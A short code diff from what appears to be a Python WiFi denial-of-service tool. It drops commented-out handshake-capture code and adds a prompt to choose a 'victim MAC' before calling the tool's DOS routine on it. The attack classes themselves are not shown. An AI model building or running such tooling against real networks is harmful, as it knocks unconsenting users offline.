@@ -56,22 +56,8 @@ if __name__ == "__main__":
     attack = DOS(wifi, inter)
     attack.intercept()
 
-"""
-    scan2 = Scanner(inter)
-    scan2.run_handshake()
-    handshake = scan2.get_handshake() or []
+    victim = questionary.select(
+        "Select the victim MAC:", choices=list(attack.mac)
+    ).ask()
 
-    found = set()
-    for pkt in handshake:
-        ssid = "Hidden"
-        if pkt.haslayer(scapy.Dot11Elt):
-            try:
-                ssid = pkt[scapy.Dot11Elt].info.decode("utf-8", errors="ignore")
-            except Exception:
-                pass
-
-        if ssid == wifi:
-            found.add(pkt)
-
-    print(f"[*] Packets matched for '{wifi}': {len(found)}")
-"""
+    attack.DOS(victim)
